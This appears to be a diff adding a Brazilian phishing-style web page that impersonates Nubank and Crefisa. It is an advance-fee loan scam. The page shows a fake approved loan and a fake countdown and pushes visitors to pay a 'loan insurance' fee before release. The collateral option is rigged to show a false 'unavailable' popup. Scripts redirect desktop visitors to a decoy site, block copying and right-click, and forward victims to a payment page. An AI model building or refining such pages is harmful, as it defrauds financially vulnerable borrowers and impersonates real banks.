@@ -1,0 +1,808 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5HHS3G78');</script>
+<!-- End Google Tag Manager -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nubank - Última Etapa do Empréstimo</title>
+  <style>
+    :root {
+      --primary: #9903d6;
+      --primary-light: #b347e8;
+      --primary-dark: #7a02a8;
+      --bg: #f8f9fa;
+      --card: #fff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --success: #16a34a;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --radius: 16px;
+      --shadow: 0 4px 20px rgba(153, 3, 214, 0.08);
+      --shadow-lg: 0 8px 32px rgba(153, 3, 214, 0.12);
+      --shadow-xl: 0 20px 40px rgba(153, 3, 214, 0.15);
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, var(--bg) 0%, #e2e8f0 100%);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+      user-select: none;
+    }
+
+    /* Header */
+    .navbar {
+      background: var(--primary);
+      padding: 16px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 20px rgba(153, 3, 214, 0.2);
+    }
+
+    .navbar img {
+      height: 35px;
+      width: auto;
+    }
+
+    /* Main Container */
+    .main-container {
+      min-height: calc(100vh - 67px);
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-xl);
+      padding: 32px 24px;
+      border: 1px solid rgba(153, 3, 214, 0.08);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Title Section */
+    .title-section {
+      text-align: center;
+      margin-bottom: 24px;
+      animation: slideUp 0.6s ease-out 0.2s both;
+    }
+
+    .main-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 16px;
+    }
+
+    .valor-liberado {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 16px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+    }
+
+    .countdown-container {
+      background: linear-gradient(135deg, #fff4e5, #fef3e2);
+      border: 2px solid #f59e0b;
+      border-radius: 12px;
+      padding: 16px;
+      text-align: center;
+      font-weight: 600;
+      color: #92400e;
+      margin-bottom: 24px;
+    }
+
+    .countdown {
+      font-size: 1.2rem;
+      color: var(--danger);
+    }
+
+    /* Info Section */
+    .info-section {
+      margin-bottom: 24px;
+      animation: slideUp 0.6s ease-out 0.4s both;
+    }
+
+    .info-card {
+      background: linear-gradient(135deg, #f0f9ff, #e0f2fe);
+      border: 2px solid rgba(153, 3, 214, 0.2);
+      border-left: 6px solid var(--primary);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .badge-importante {
+      background: var(--primary);
+      color: white;
+      padding: 4px 12px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: 600;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+
+    .info-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .benefit-tags {
+      display: flex;
+      gap: 8px;
+      margin: 12px 0;
+      flex-wrap: wrap;
+    }
+
+    .benefit-tag {
+      background: rgba(22, 163, 74, 0.1);
+      color: var(--success);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 500;
+      border: 1px solid rgba(22, 163, 74, 0.2);
+    }
+
+    .info-list {
+      list-style: none;
+      padding: 0;
+      margin: 12px 0;
+    }
+
+    .info-list li {
+      padding: 4px 0;
+      padding-left: 20px;
+      position: relative;
+      font-size: 0.9rem;
+      color: var(--text-light);
+    }
+
+    .info-list li::before {
+      content: '✓';
+      position: absolute;
+      left: 0;
+      color: var(--success);
+      font-weight: bold;
+    }
+
+    /* Video Section */
+    .video-section {
+      margin: 24px 0;
+      text-align: center;
+      animation: slideUp 0.6s ease-out 0.6s both;
+    }
+
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: var(--shadow-lg);
+      background: #000;
+    }
+
+    .video-wrapper video {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* Options Section */
+    .options-section {
+      margin-top: 32px;
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(30px);
+      transition: all 0.6s ease-out;
+    }
+
+    .options-section.show {
+      opacity: 1;
+      visibility: visible;
+      transform: translateY(0);
+    }
+
+    .options-title {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .option-card {
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 16px;
+      transition: var(--transition);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .option-card.recommended {
+      border-color: var(--primary);
+      background: linear-gradient(135deg, #f8fffe, #f0fdf4);
+      box-shadow: 0 0 0 2px rgba(153, 3, 214, 0.1);
+    }
+
+    .option-card:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    .option-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+
+    .option-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .recommended-badge {
+      background: var(--primary);
+      color: white;
+      padding: 4px 8px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 600;
+    }
+
+    .option-benefits {
+      list-style: none;
+      padding: 0;
+      margin: 12px 0 20px 0;
+    }
+
+    .option-benefits li {
+      padding: 6px 0;
+      font-size: 0.9rem;
+      color: var(--text-light);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Buttons */
+    .btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .btn:hover::before {
+      left: 100%;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(153, 3, 214, 0.3);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-secondary {
+      background: linear-gradient(135deg, #6b7280, #9ca3af);
+    }
+
+    .btn-secondary:hover {
+      box-shadow: 0 8px 25px rgba(107, 114, 128, 0.3);
+    }
+
+    /* Loading State */
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid transparent;
+      border-top: 2px solid currentColor;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Success Message */
+    .success-message {
+      background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+      border: 2px solid var(--success);
+      color: #166534;
+      padding: 16px;
+      border-radius: 12px;
+      text-align: center;
+      font-weight: 600;
+      margin: 16px 0;
+      display: none;
+      animation: slideUp 0.4s ease-out;
+    }
+
+    /* Popup */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 9998;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: var(--transition);
+    }
+
+    .popup-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 32px 24px;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-xl);
+      max-width: 90%;
+      width: 400px;
+      text-align: center;
+      transform: scale(0.8);
+      transition: var(--transition);
+    }
+
+    .popup-overlay.show .popup-content {
+      transform: scale(1);
+    }
+
+    .popup-icon {
+      font-size: 4rem;
+      margin-bottom: 16px;
+    }
+
+    .popup-title {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: var(--danger);
+      margin-bottom: 12px;
+    }
+
+    .popup-message {
+      color: var(--text-light);
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    /* Mobile Optimizations */
+    @media (max-width: 768px) {
+      .main-container {
+        padding: 16px;
+      }
+      
+      .container {
+        padding: 24px 20px;
+      }
+      
+      .navbar {
+        padding: 15px 4%;
+      }
+      
+      .main-title {
+        font-size: 1.3rem;
+      }
+      
+      .valor-liberado {
+        font-size: 1.6rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .option-card {
+        padding: 16px;
+      }
+      
+      .btn {
+        padding: 14px;
+        font-size: 0.95rem;
+      }
+      
+      .benefit-tags {
+        gap: 6px;
+      }
+      
+      .benefit-tag {
+        font-size: 11px;
+        padding: 4px 8px;
+      }
+    }
+
+    /* Accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+
+    /* Focus States */
+    .btn:focus {
+      outline: 2px solid var(--primary);
+      outline-offset: 2px;
+    }
+
+    /* High Contrast Mode */
+    @media (prefers-contrast: high) {
+      :root {
+        --primary: #7a02a8;
+        --text: #000;
+        --text-light: #333;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Header -->
+  <nav class="navbar">
+    <div><img src="images/crefisa.png" alt="Logo"></div>
+    <div></div>
+  </nav>
+
+  <!-- Main Container -->
+  <div class="main-container">
+    <div class="container">
+      <!-- Title Section -->
+      <div class="title-section">
+        <h2 class="main-title">Última etapa para liberar seu empréstimo</h2>
+        <div class="valor-liberado" id="valorAprovado">Valor aprovado: R$ 4.600,00</div>
+        <div class="countdown-container" id="countdown-container">
+          ⏳ Oferta válida por: <span class="countdown" id="countdown">30:00</span>
+        </div>
+      </div>
+
+      <!-- Info Section -->
+      <div class="info-section">
+        <div class="info-card">
+          <div class="badge-importante">IMPORTANTE</div>
+          <h3 class="info-title">📌 Por que solicitamos o Seguro Prestamista?</h3>
+          <p style="margin-bottom: 12px;">Essa proteção garante que seu empréstimo seja quitado mesmo em casos de:</p>
+          
+          <div class="benefit-tags">
+            <span class="benefit-tag">💼 Perda de renda</span>
+            <span class="benefit-tag">🚑 Acidente</span>
+            <span class="benefit-tag">🏥 Invalidez</span>
+          </div>
+          
+          <p style="margin-bottom: 12px;"><strong>Além disso:</strong></p>
+          <ul class="info-list">
+            <li>O valor do seu empréstimo é tratado como prioridade, garantindo depósito em 5 minutos após o pagamento</li>
+            <li>O valor pago pelo seguro é abatido da primeira parcela</li>
+            <li>Não é necessário apresentar bens como garantia</li>
+            <li>Assista o vídeo explicativo abaixo</li>
+          </ul>
+        </div>
+
+        <!-- Video Section -->
+        <div class="video-section">
+          <div class="video-wrapper">
+            <video id="vsl" src="media/vsl.mp4" controls="" playsinline="" poster="/nbk/pagar-pac-3500/video/pix.png"></video>
+          </div>
+        </div>
+
+        <div class="info-card" style="background: #fff4e5; border-color: #f59e0b;">
+          <p style="color: #92400e; font-weight: 500; text-align: center;">
+            ⚠️ Caso opte por não contratar o seguro, será necessário apresentar um bem como garantia.
+          </p>
+        </div>
+      </div>
+
+      <!-- Options Section -->
+      <div class="options-section" id="optionsSection">
+        <h3 class="options-title" id="tituloOpcoes">Escolha uma das opções abaixo:</h3>
+
+        <div class="option-card recommended" id="opcao1">
+          <div class="option-header">
+            <h4 class="option-title">
+              ✔ Seguro Prestamista
+            </h4>
+            <span class="recommended-badge">Recomendado</span>
+          </div>
+          <ul class="option-benefits">
+            <li>✅ Liberação imediata e valor total</li>
+            <li>✅ Vinculado à fatura do cartão</li>
+            <li>✅ Sem necessidade de avaliação pessoal</li>
+            <li>✅ Proteção completa contra imprevistos</li>
+          </ul>
+          <button class="btn" id="next-btn" onclick="simularAcao(this)">
+            <span>Selecionar Opção</span>
+            <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zM4.5 7.5a.5.5 0 0 0 0 1h5.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3a.5.5 0 0 0 0-.708l-3-3a.5.5 0 1 0-.708.708L10.293 7.5H4.5z"></path>
+            </svg>
+          </button>
+          <div class="success-message" id="success-message">
+            ✅ Solicitação registrada com sucesso! Redirecionando...
+          </div>
+        </div>
+
+        <div class="option-card" id="opcao2">
+          <div class="option-header">
+            <h4 class="option-title">
+              ✔ Entregar Veículo ou Imóvel como garantia
+            </h4>
+          </div>
+          <ul class="option-benefits">
+            <li>📍 Inclusão presencial do bem</li>
+            <li>🕒 Liberação em até 5 dias úteis</li>
+            <li>🔍 Avaliação comercial obrigatória</li>
+            <li>📋 Documentação adicional necessária</li>
+          </ul>
+          <button class="btn btn-secondary" onclick="simularGarantia(this)">
+            <span>Selecionar Opção</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Popup -->
+  <div class="popup-overlay" id="popup">
+    <div class="popup-content">
+      <div class="popup-icon">😕</div>
+      <h3 class="popup-title">Opção Indisponível</h3>
+      <p class="popup-message">No momento, esta opção está temporariamente desativada para manutenção. Por favor, selecione a opção recomendada.</p>
+      <button class="btn" onclick="closePopup()">Entendi</button>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    let optionsShown = false;
+
+    // Initialize page
+    document.addEventListener("DOMContentLoaded", function () {
+      // Desktop redirect
+      if (window.innerWidth >= 1024) {
+        window.location.href = "https://atendimentoonline.store/blog/";
+        return;
+      }
+
+      // Security measures
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && (e.key === 'c' || e.key === 'v')) {
+          e.preventDefault();
+        }
+      });
+
+      // Initialize countdown
+      initCountdown();
+      
+      // Load user data
+      loadUserData();
+
+      // Setup video event listener
+      setupVideoEvents();
+    });
+
+    // Setup video events
+function setupVideoEvents() {
+  const video = document.getElementById('vsl');
+  
+  video.addEventListener('play', function() {
+    if (!optionsShown) {
+      // Mostrar o botão 20 segundos depois que o vídeo começar
+      setTimeout(() => {
+        showOptions();
+      }, 20000); // 20000 milissegundos = 20 segundos
+        }
+      });
+    }
+
+    // Show options with animation
+    function showOptions() {
+      if (!optionsShown) {
+        const optionsSection = document.getElementById('optionsSection');
+        optionsSection.classList.add('show');
+        optionsShown = true;
+      }
+    }
+
+    // Countdown timer
+    function initCountdown() {
+      let tempoRestante = 1800; // 30 minutes
+      const countdownEl = document.getElementById('countdown');
+      
+      const countdown = setInterval(() => {
+        tempoRestante--;
+        const minutos = Math.floor(tempoRestante / 60);
+        const segundos = tempoRestante % 60;
+        countdownEl.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+        
+        if (tempoRestante <= 0) {
+          clearInterval(countdown);
+          countdownEl.textContent = 'EXPIRADO';
+          countdownEl.style.color = 'var(--danger)';
+        }
+      }, 1000);
+    }
+
+    // Load user data
+    function loadUserData() {
+      // You can customize this based on your data structure
+      const valorEl = document.getElementById("valorAprovado");
+      valorEl.textContent = "Valor aprovado: R$ 4.600,00";
+    }
+
+    // Simulate action for recommended option
+    function simularAcao(botao) {
+      const successMessage = document.getElementById('success-message');
+      
+      // Add loading state
+      botao.innerHTML = '<div class="spinner"></div>Processando...';
+      botao.disabled = true;
+      
+      setTimeout(() => {
+        // Show success message
+        successMessage.style.display = 'block';
+        botao.innerHTML = '<span>Selecionado</span> ✅';
+        botao.style.background = 'var(--success)';
+        
+        // Redirect after delay
+        setTimeout(() => {
+          redirectWithParams('tlpagamento');
+        }, 2000);
+      }, 1500);
+    }
+
+    // Simulate guarantee option (show popup)
+    function simularGarantia(botao) {
+      const popup = document.getElementById('popup');
+      popup.classList.add('show');
+    }
+
+    // Close popup
+    function closePopup() {
+      const popup = document.getElementById('popup');
+      popup.classList.remove('show');
+    }
+
+    // Redirect with URL parameters
+    function redirectWithParams(baseUrl) {
+      const params = new URLSearchParams(window.location.search);
+      const queryString = params.toString();
+      const newUrl = queryString ? `${baseUrl}?${queryString}` : baseUrl;
+      window.location.href = newUrl;
+    }
+  </script>
+<!-- Pixel Meta + UTMify com deduplicação -->
+<script>
+  // Gera um eventID único para deduplicação
+  const eventId = 'page-' + Date.now();
+
+  // --- Meta Pixel ---
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+  
+  fbq('init', '1607974976562499');
+  fbq('track', 'PageView', {}, {eventID: eventId});
+
+  // --- UTMify Pixel ---
+  window.pixelId = "684c7d3bb21e8e0cccb36251";
+  window.eventID = eventId; // mesmo ID para deduplicação
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1607974976562499&ev=PageView&noscript=1"/>
+</noscript>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+</body></html>
